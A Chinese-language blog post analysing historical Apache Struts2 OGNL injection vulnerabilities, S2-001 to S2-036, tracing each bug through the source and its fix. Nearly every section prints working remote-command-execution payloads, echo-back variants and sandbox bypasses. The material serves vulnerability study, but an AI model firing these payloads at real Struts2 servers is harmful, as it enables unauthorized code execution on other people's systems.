---
title: struts2历史漏洞分析
tags: 
  - java
categories: notes
date: 2020-05-22 17:14:38
typora-root-url: ../../../source
---
## 0x00 前言

---

17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD

<!-- more -->

## 0x01 基础

---

struts2 源码下载https://archive.apache.org/dist/struts/source/

struts2工作流程 https://blog.csdn.net/snow_7/article/details/51513381

ognl表达式https://www.cnblogs.com/renchunxiao/p/3423299.html

struts2 技术内幕 第6章 OGNL

struts2漏洞的产生通OGNL表达式的执行有很大的关联，历史上很多版本的漏洞，都是因为不安全的用户输入流转到了`Ognl.getValue`、`Ognl.setValue`而导致的OGNL表达式的计算。后文不对Ognl后续的内容做分析

```java
// 调用静态函数 执行命令
Ognl.getValue("@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')", context);
Ognl.setValue("(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')\")(bla)(bla)",context,"");
```

更多用法看http://commons.apache.org/proper/commons-ognl/language-guide.html

其中关于`setValue`的利用用的是Expression Evaluation部分，`(1)(2)(3)`中`(1)(2)`被作为一个整体解析，对于`(1)`做表达式的解析，如果你用`getValue((1)(2))`会发现其实也能执行命令，而`setValue((1)(2)(3))`需要double evaluation，实际上变成`((1)(2))(3)`，在后续调用`setValueBody`函数时取出的`children[0]`就是`(1)(2)`，等同于调用`Ognl.getValue((1)(2))`的效果。所以这里调用`setValue`也同样可以达成`getValue`的计算OGNL表达式的效果。

![image-20200506154002054](/images/talk_about_struts2/image-20200506154002054.png)

同样，我们也可以利用`children[1]`的位置，如`(1)((2)(3))`把payload放到`(2)(3)`

关于`setValue`函数的另一种利用方法S2-009的方式`a[(1)(2)]`，其中`(1)(2)`后续会单独拿出来被当作OGNL表达式执行。

## 0x02 历史版本回顾

---

### 1. [S2-001](https://cwiki.apache.org/confluence/display/WW/S2-001)

参考：https://xz.aliyun.com/t/2044

漏洞产生原因在于：用`<s:textfield>`标签，原样返回用户输入时，会过一次OGNL表达式的解析执行。比如场景登陆的地方，用户名密码校验错误，不跳转页面，直接将用户名和密码放到页面解析后返回。

source: 使用了`s:textfield`标签用于表单生成，当用户输入不合法时，将用户的输入内容渲染到返回的页面上

sink: jsp渲染调用`doEndTag `，后续由于识别出用户输入中OGNL表达式而调用`Ognl.getValue`

#### 漏洞分析

主要出问题的是JSP中`<s:textfield>`标签，Struts2里处理textfield的是`org.apache.struts2.components.UIBean`

![image-20200428211153680](/images/talk_about_struts2/image-20200428211153680.png)

![image-20200428212308880](/images/talk_about_struts2/image-20200428212308880.png)

看到在处理params时，当parameters里不存在`value`这个key的时候，会进到执行name相对应的value上来。并且`altSyntax`默认配置为`true`

![image-20200428213206168](/images/talk_about_struts2/image-20200428213206168.png)

会在当前的`name`左右加上OGNL表达式的标识` %{name}`，这里的name是`<s:textfield name="name"`，name字段的值，比如这里`name="username"`，此时会变成` %{username}`.继续往下跟

![image-20200428220429903](/images/talk_about_struts2/image-20200428220429903.png)

![image-20200428220447992](/images/talk_about_struts2/image-20200428220447992.png)

这里的String类型的转化主要用了`TextParesUtil.translateVariables()`来处理，这里看看具体他怎么做的

`com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97`

![image-20200428221026617](/images/talk_about_struts2/image-20200428221026617.png)

这里会去判断传入的expression是否是OGNL表达式的格式的` %{xxx}`，如果是的话，就会去`OgnlValueStack`里面去找对应的内容(这块就是OGNL表达式的计算结果，`findValue`函数后续会去调用`OgnlUtil.getValue`，详细的可以看我基础里列的文章)

所以这里我们第一遍传入的` %{name}`会解析获得对应的值` %{@java.lang.Runtime.....}`

第二遍会去解析` %{@java.lang.Runtime....}`，这里执行了我们想要执行的命令。

#### 回显POC

前面简单用了OGNL表达式调用静态方法的形式来执行系统命令` @java.lang.Runtime@getRuntime().exec(command)`

这里S2-001其实是会直接回显的，将替换原有的input标签的内容，这里换一种方式来进行回显，利用Struts2的HttpServletResponse来写入内容。

```
#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
#writer.println(xxxxxx),
#writer.flush(),
#writer.close()
```

先从上下文context中取出`HttpServletResponse`的实例，用到的实际是`HttpServletResponseWrapper`

![image-20200428223750035](/images/talk_about_struts2/image-20200428223750035.png)

然后获取当前response的writer对象，在利用该writer来写入任意内容

比如

```
%{#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#writer.println("wh1t3p1g"),#writer.flush(),#writer.close()}
```

当然你也可以替换成执行命令后的内容

```
#pb=(new java.lang.ProcessBuilder("whoami")).start(),
#is=#pb.getInputStream(),
#isr=new InputStreamReader(#is),
#br=new BufferedReader(#isr),
#chars=new char[500],
#br.read(#chars),
#str=new java.lang.String(#chars),
// 上面主要获取执行后的内容，下面主要做回显操作
#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
#writer.println(#str),
#writer.flush(),
#writer.close()

%{#pb=(new java.lang.ProcessBuilder("whoami")).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #writer.println(#str),#writer.flush(),#writer.close()}
```

#### 修复

在>=2.0.9版本的struts2上，`com.opensymphony.xwork2.util.TextParseUtil#translateVariables`做了循环判断，不允许递归执行OGNL表达式

![image-20200428231900257](/images/talk_about_struts2/image-20200428231900257.png)

默认`maxLoopCount`为1，所以处理完`%{name}`后，不会再继续对他的值进行OGNL表达式的执行了。

### 2. [S2-003](https://cwiki.apache.org/confluence/display/WW/S2-003)

影响范围：2.0.0 - 2.0.11.2

看官网的介绍，问题出在`ParametersInterceptor`，前面利用了`Ognl.getValue`来计算OGNL表达式，而S2-003用的则是`Ognl.setValue`，该函数也同样可以计算OGNL表达式

source: 参数的key，使用unicode编码绕过`#`的检测

sink: 调用`Ognl.setValue`

#### 漏洞分析

Struts2在处理参数内容时，将调用`com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters`函数，填充到OgnlVauleStack的context上下文里。

![image-20200430155156109](/images/talk_about_struts2/image-20200430155156109.png)

这里会先过一次`acceptableName`的检查（2.0.8版本）

![image-20200430155231489](/images/talk_about_struts2/image-20200430155231489.png)

不能出现`=`、`,`、`#`、`:`以及被排除在外的参数名

![image-20200430155418664](/images/talk_about_struts2/image-20200430155418664.png)

只有通过了acceptableName函数的检查才能继续往下走，所以我们必须绕过上面的几个问题，这里漏洞发现者用了unicode编码来绕过检测。

`ognl.JavaCharStream#readChar`

![image-20200430232206989](/images/talk_about_struts2/image-20200430232206989.png)

当遇到`\u`unicode编码，会做一次转换，比如`\u0040`会被转成`@`

而`acceptableName`函数并没有考虑unicode编码的方式，导致其形同虚设。

回到`setParameters`，后续调用了`OgnlValueStack.setValue`

![image-20200430232635455](/images/talk_about_struts2/image-20200430232635455.png)

这里最终到了`OgnlUtil.setValue`计算OGNL表达式

#### POC分析

来看一个调用命令执行的POC

```java
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0040java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app\')')(bla)(bla)
```

先来看第一句，该条ognl表达式用于开启方法执行，因为在调用`setParameters`之前，开发人员考虑到了参数执行OGNL表达式的风险，所以提前关闭了函数调用执行

![image-20200430234629782](/images/talk_about_struts2/image-20200430234629782.png)

设置完了之后，再还原回来

但是OGNL表达式对于上下文的内容是可控的，我们可以在进行函数调用前，将context里的`xwork.MethodAccessor.denyMethodExecution`设为`false`， 这样第二句poc就可以执行函数调用了。

所以在发送这两条POC时，需要控制好设置false在前，执行在后（ascii排序，可以看回显poc的处理）

跟前面一样，写一下回显的POC

```java
(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))
(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')')(bla))& // 执行命令
(c)(('\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())')(bla))&
(d)(('\u0023res\u003dnew\u0020byte[2000]')(bla))&
(e)(('\u0023dis.readFully(\u0023res)')(bla))&
(f)(('\u0023writer\u003d\u0023context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\').getWriter()')(bla))&
(g)(('\u0023writer.println(new\u0020java.lang.String(\u0023res))')(bla))& // 获取response，回显数据
(h)(('\u0023writer.flush()')(bla))&
(i)(('\u0023writer.close()')(bla))
```

这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置`(1)((2)(3))`

#### 修复

xwork>=2.0.6 `com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters`多了以下代码

![image-20200507101610804](/images/talk_about_struts2/image-20200507101610804.png)

低版本用的直接是已存在的OgnlValueStack，从2.0.6开始，使用了一个空的stack来处理参数的解析

并且从这个版本开始多了SecurityMemberAccess，用来限制ognl表达式中函数调用

在`ognl.OgnlRuntime#callAppropriateMethod`调用函数前，会去判断函数是否可被访问(method不为null)

![image-20200507102155210](/images/talk_about_struts2/image-20200507102155210.png)

其实这边`isMethodAccessible`的返回结果无所谓，但是不能在这个函数调用时出错，出错的话也就走不到`invokeMethod`

看一下具体的实现，`isMethodAccessible`的判断依赖于`SecurityMemberAccess`

![image-20200507102334789](/images/talk_about_struts2/image-20200507102334789.png)

![image-20200507103428140](/images/talk_about_struts2/image-20200507103428140.png)

这里我们主要看`isAcceptableProperty`

![image-20200507103621957](/images/talk_about_struts2/image-20200507103621957.png)

![image-20200507103632321](/images/talk_about_struts2/image-20200507103632321.png)

![image-20200507103642250](/images/talk_about_struts2/image-20200507103642250.png)

下端点调试你会发现这个版本acceptProperties为空，而excludeProperties非空，所以在调用`isExclude`函数时，正则调用`pattern.matcher(null)`会报错，也就无法达到调用函数的目的了（`propertiesName`为null）。

所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005

### 3. [S2-005](https://cwiki.apache.org/confluence/display/WW/S2-005)

影响版本：struts2.0.0 - 2.1.8.1

S2-005为S2-003的修复绕过，直接分析POC

#### POC分析

```java
('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&
('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla)(bla)
```

前面S2-003修复部分说到了需要绕过`isAcceptableProperty`函数报错的问题才能继续往下进行函数调用。

从代码上看，只要`excludeProperties`和`acceptProperties`为空，就不会进到正则匹配的环节，所以需要将他们置为空

poc里的第一行做的就是这个事情，将`excludeProperties`置为空集合

这里看一下为什么以`#_memberAccess`的方式可以访问到`OgnlContext`对象的`memberAccess`属性

`ognl.OgnlContext#get`

![image-20200507110201209](/images/talk_about_struts2/image-20200507110201209.png)

从`OgnlContext`上下文获取内容，首先会判断是否在`RESERVED_KEYS`集合里，如果存在，则相应的调用他的getters，如果不存在，则从当前的上下文里去找这个key。

所以`#_memeberAccess`实际获取的是`OgnlContext`的`memeberAccess`属性内容

还有出现变化的地方，由于现在context里是没有response对象可以获取的，所以在处理回显的时候我们需要找另外的方法

```java
(a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&
(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&
(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')')(bla))& // 执行命令
(c)(('\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())')(bla))&
(d)(('\u0023res\u003dnew\u0020byte[2000]')(bla))&
(e)(('\u0023dis.readFully(\u0023res)')(bla))&
(f)(('\u0023writer\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()')(bla))&
(g)(('\u0023writer.println(new\u0020java.lang.String(\u0023res))')(bla))& // 获取response，回显数据
(h)(('\u0023writer.flush()')(bla))&
(i)(('\u0023writer.close()')(bla))
```

这里使用了`@org.apache.struts2.ServletActionContext@getResponse()`静态方法来获取response

#### 修复

xwork>=2.2.1.1，对参数名做了更为细致的正则检查`[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+`

### 4. S2-007

这里跟S2-008里面的第一个漏洞一样

`com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept`

![image-20200509111903026](/images/talk_about_struts2/image-20200509111903026.png)

value为我们传入的数据，过了一次getOverrideExpr

![image-20200509111939166](/images/talk_about_struts2/image-20200509111939166.png)

对我们的输入围上了单引号，这里如果我们的payload为`'+xxxx+'`，这里的xxxx就逃逸出来了，而不单单是字符串了

![image-20200509112218065](/images/talk_about_struts2/image-20200509112218065.png)

后续将处理好的数据放到了stack的overrides里面

而实际触发的地方跟S2-001一样，是在解析JSP的时候造成的

<img src="/images/talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;" />

在`tryFIndValue`函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用`Ognl.getValue`，导致了Ognl表达式的执行。

#### POC

```java
'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +'
```

xwork>=2.2.3，ognl表达式计算时，调用函数的函数判断`isAcceptableProperty`如果name为null直接返回true，所以我们不用像s2-005那样把`excludeProperties`置为空集合。

![image-20200509120444634](/images/talk_about_struts2/image-20200509120444634.png)

但是从这里开始，`allowStaticMethodAccess`默认为false，我们需要将其置为true，才能正常执行静态函数。

所以POC第一二句都是在解除限制，第三句执行命令

写一下回显的POC

```java
'+ (
#_memberAccess.allowStaticMethodAccess=true,
#context['xwork.MethodAccessor.denyMethodExecution']=false,
#ret=@java.lang.Runtime@getRuntime().exec('id'),
#isr=new java.io.InputStreamReader(#ret.getInputStream()),
#br=new java.io.BufferedReader(#isr),
#res=new char[2000],
#br.read(#res),
#writer=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),
#writer.println(new java.lang.String(#res)),
#writer.flush(),
#writer.close()
) +'
```

### 5. S2-008

S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display/WW/S2-008

其中1跟S2-007类似，3不看了，主要关注2和4

#### CookieInterceptor

这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了

`org.apache.struts2.interceptor.CookieInterceptor#intercept`

![image-20200509202547849](/images/talk_about_struts2/image-20200509202547849.png)

![image-20200509202741614](/images/talk_about_struts2/image-20200509202741614.png)

这里会到`OgnlValueStack.setValue`，也就是后续调用`Ognl.setValue`，用`((1)(2))(3)`的方式来执行任意OGNL表达式

#### DebuggingInterceptor

![image-20200509204915751](/images/talk_about_struts2/image-20200509204915751.png)

当开启开发者模式时，传入`debug=command&expression=xxxx`，即可执行OGNL表达式

#### POC

```java
?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))
// 回显POC
(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res))
```

### 6. [S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)

影响范围：2.0.0 - 2.3.1.1

针对S2-005的修复，对参数做`[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+`正则检查，这里规避了参数名中出现`#`、unicode编码等

S2-009是对S2-005的绕过，这里用的就是`Ognl.setValue`函数的另一种用法`a[(1)(2)]`，还有一个比较巧妙的是，前面的几个漏洞利用，我们都是直接在`(1)`写上要执行的OGNL表达式，而S2-009则通过context里的内容来进行一个中转，将OGNL表达式放到`key=value`的value的位置，再由`a[(key)(2)]`的方式去执行value的内容。

```java
OgnlContext context = new OgnlContext();
context.put("test","@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')"); // 假设context存在执行系统命令的OGNL表达式test
Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代表的OGNL表达式
```

上面代码中的假设，我们可以通过传入`?param=xxx`的方式带入

注意这里的param需要是当前Action的一个类属性（也就是原本就存在的参数名），比如原本表单里就有password，那么你就可以在password里面填充OGNL表达式

因为在计算OGNL表达式`(password)(bla)`的时候(解析出两个ASTProperty)

![image-20200511171450014](/images/talk_about_struts2/image-20200511171450014.png)

后续再执行过程中，会去查找当前的action里面是否含有这个属性

![image-20200511171056619](/images/talk_about_struts2/image-20200511171056619.png)

`com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty`

![image-20200511204523185](/images/talk_about_struts2/image-20200511204523185.png)

如果当前存在这个属性的时候，返回其内容

后续就是跟`(1)(2)`这种执行的原理一样，会以`(1)`作为node调用getValue。

这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测

#### POC

```java
?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&z[(password)(bla)]=1
// 回显POC
?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&z[(password)(bla)]=1
```

#### 修复

改进了正则

![image-20200511222139049](/images/talk_about_struts2/image-20200511222139049.png)

增加了`setParameter`函数，默认设置表达式不可执行

![image-20200511223638532](/images/talk_about_struts2/image-20200511223638532.png)

![image-20200519154216690](/images/talk_about_struts2/image-20200519154216690.png)



### 7. S2-012

影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2

>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.
>This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.

看描述可以知道是struts2在处理redirect的时候出现的问题。

![image-20200513145252050](/images/talk_about_struts2/image-20200513145252050.png)

![image-20200513145417046](/images/talk_about_struts2/image-20200513145417046.png)

结果返回后回去调用`ServletRedirectResult`来处理

来看看该对象的实际处理函数`org.apache.struts2.dispatcher.ServletRedirectResult#execute`

![image-20200513145546225](/images/talk_about_struts2/image-20200513145546225.png)

![image-20200513150115678](/images/talk_about_struts2/image-20200513150115678.png)

在父类execute函数调用了`conditionalParse`函数

![image-20200513150240332](/images/talk_about_struts2/image-20200513150240332.png)

这里出现了我们比较熟悉的`TextParseUtil.translateVariables`，S2-001就是由这个函数来处理String类型转化的。

此时param为我们在struts.xml中的配置`edit.action?skillName=${currentSkill.name}`

前面分析过`translateVariables`，这里直切主题

出问题的地方跟S2-001一样

![image-20200513151342610](/images/talk_about_struts2/image-20200513151342610.png)

触发总共分为两步：

1. 将xml配置中`${currentSkill.name}`解析成传入的值，此时stack.findValue会去找到前面处理好后的Result里面的currentSkill.name的值

   ![image-20200513151651915](/images/talk_about_struts2/image-20200513151651915.png)

2. 由于`translateVariables`的解析OGNL表达式有两种`$`、`%`，并且是循环去处理的

   ![image-20200513151842698](/images/talk_about_struts2/image-20200513151842698.png)

   首先是去处理`$`，将`${currentSkill.name}`解析成具体的值，并且将result的值置为他的内容

   虽然已经修复了循环递归执行的问题(s2-001会执行两层`${}`)，但是因为还循环去处理`%`，那么仍然可以达到循环递归计算的效果`${另一层以%起始的ognl表达式}`，所以POC里面需要用`%{}`来写入OGNL表达式

所以对于S2-012来说，配置中`${currentSkill.name}`是至关重要的

#### 修复

由于我前面分析的是`2.2.3`版本，后续的版本的`translateVariables`变化有点大，其修复版本

![image-20200513155116772](/images/talk_about_struts2/image-20200513155116772.png)

增加了pos来做起始位置来查找`${}%{}`，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行

#### POC

```
currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}
// 回显POC
%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())}
```

### 8. S2-013/S2-014

影响范围：Struts 2.0.0 - Struts 2.3.14.1

这次的原理跟S2-001类似，只是问题出在解析`<s:a>`、`<s:url>`，当这两个标签支持`includeParams`

![image-20200514151446611](/images/talk_about_struts2/image-20200514151446611.png)

当当前的href为空时，会用当前url来填充href，也就是在`buildUrl`时导致的OGNL表达式的执行

这里不具体分析了，看一下他的执行栈

<img src="/images/talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;" />

`org.apache.struts2.views.util.DefaultUrlHelper#translateVariable`

![image-20200514151844894](/images/talk_about_struts2/image-20200514151844894.png)

也同样是使用String转换时出现的OGNL表达式执行

#### POC

```java
?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}
// 回显POC
?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())}
```

#### 修复

![image-20200514152500049](/images/talk_about_struts2/image-20200514152500049.png)

![image-20200514152517255](/images/talk_about_struts2/image-20200514152517255.png)

这里`org.apache.struts2.views.util.DefaultUrlHelper`不再使用TextParseUtil来处理

### 9. S2-015

影响范围：Struts 2.0.0 - Struts 2.3.14.2

S2-015一共有两种：

第一种漏洞原理跟S2-012类似，这次问题不是出在重定向，而是在解析具体的action name时出现的问题

![image-20200514165546294](/images/talk_about_struts2/image-20200514165546294.png)

这里的`{1}`会被替换成`xxx.action`的`xxx`，这里的`xxx`如果被我们替换成OGNL表达式，会在后续的`TextParseUtil.translateVariables`得到执行，过程跟S2-012一样，不再叙述。

第二种是结果由httpheader来处理时，会将我们的`${message}`嵌套执行

![image-20200514202040764](/images/talk_about_struts2/image-20200514202040764.png)

`org.apache.struts2.dispatcher.HttpHeaderResult#execute`

![image-20200514202919865](/images/talk_about_struts2/image-20200514202919865.png)

跟S2-012一样，解析执行`${另一层以%起始的OGNL表达式}`

#### POC

```
// 摘自https://www.freebuf.com/vuls/217482.html
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action
// 第二种
？message=%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}
```

这里比较特殊的是这里对原有`#_memberAccess['allowStaticMethodAccess']=true`，改成了

```java
// 原来的方式
#_memberAccess['allowStaticMethodAccess']=true

// 通过反射机制来设置#_memberAccess['allowStaticMethodAccess']
#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),
#m.setAccessible(true),
#m.set(#_memberAccess,true)
```

为什么要通过这种方式来写入呢？

先来看OGNL是怎么setValue的

`ognl.OgnlRuntime#setFieldValue`

![image-20200514173311368](/images/talk_about_struts2/image-20200514173311368.png)

而此时这里我们要设置的`#_memberAccess['allowStaticMethodAccess']`

![image-20200514173631503](/images/talk_about_struts2/image-20200514173631503.png)

是final类型，我们不能使用普通的方式改变他的值，只能通过上面的反射的方式来进行修改。

这里的改变是从struts2 2.3.14.1版本开始的，意味着高于这个版本的以后的poc只能通过这种方式来设置

除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如`new ProccessBuilder('id').start()`

#### 修复

这里的修复就是S2-012的修复，主要修复了执行这种OGNL表达式`${另一层%起始的OGNL表达式}`

### 10. S2-016

范围：Struts 2.0.0 - Struts 2.3.15

S2-016问题出在处理默认的`action:xxx`或`redirect:xxx`，后面跟的`xxx`为OGNL表达式，Struts2默认将用`ServletRedirectResult`来处理跳转问题，这里跟S2-012一样，只是这里的跳转设置在url里面

执行链路跟S2-012一样，不作分析了

#### POC

```java
redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}
```

#### 修复

`org.apache.struts2.dispatcher.mapper.DefaultActionMapper`默认的`redirect/redirectaction`直接被删除了

![image-20200515154730941](/images/talk_about_struts2/image-20200515154730941.png)

`action:`部分因为S2-015的关系，限制了action名

![image-20200515154855569](/images/talk_about_struts2/image-20200515154855569.png)

已经不构成威胁了

### 11. S2-019

范围：Struts 2.0.0 - Struts 2.3.15.1

S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许使用command的模式来执行OGNL表达式

具体看S2-008

#### POC

```
?debug=command&expression=(%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23m=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())
```

#### 修复

这里后面的几个版本都是允许执行的，开发者模式下的command并没有被取消掉，所以如果在线上环境碰到debug模式，那就可以尝试一下OGNL表达式的执行

但是由于从struts2 2.3.20之后引入了黑名单模式（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），并且使用构造函数的方式也失效了

这里前辈们用到了将SecurityMemberAccess初始化的方式来绕过这个限制，原理可以好好看看这篇文章https://paper.seebug.org/794/#33-struts-2329。

```java
debug=command&expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))
```

后续还有一些绕过，后面再讲

### 12. S2-029/S2-036

S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)

S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要在修复的地方讲）

原理跟S2-001差不多，S2-029的触发需要jsp用到标签`<s:textfield name="%{xxxx}"></s:textfield>`，name属性中由一OGNL表达式解析而得，意味着生成的input标签的name属性是动态计算而得的，比如?xxxx=username，此时解析得到的input.name为username。这其中执行了`%{xxxx}`，获得xxxx的内容。而S2-001的修复主要解决的是递归计算OGNL表达式的问题，S2-029就是在进入translateVariables之前就将第一层的OGNL表达式执行完毕

![image-20200519143433067](/images/talk_about_struts2/image-20200519143433067.png)

直接看`UIBean.evaluateParams`

首先计算`%{message}`到我们传入的OGNL表达式

![image-20200519144431546](/images/talk_about_struts2/image-20200519144431546.png)

后续会在我们传入的OGNL表达式括上`%{xxx}`

![image-20200519144525695](/images/talk_about_struts2/image-20200519144525695.png)

![image-20200519144603429](/images/talk_about_struts2/image-20200519144603429.png)

此时再传入到`findValue`就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可

#### POC

```java
// 需要先初始化SecurityMemberAccess，不然无法执行
?message=((%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))
// 回显POC
?message=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23ret=@java.lang.Runtime@getRuntime().exec('id')),%23q=@org.apache.commons.io.IOUtils@toString(%23ret.getInputStream())
 // S2-036
 ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))
```

### 修复S2-029

`com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute`

![image-20200519152941105](/images/talk_about_struts2/image-20200519152941105.png)

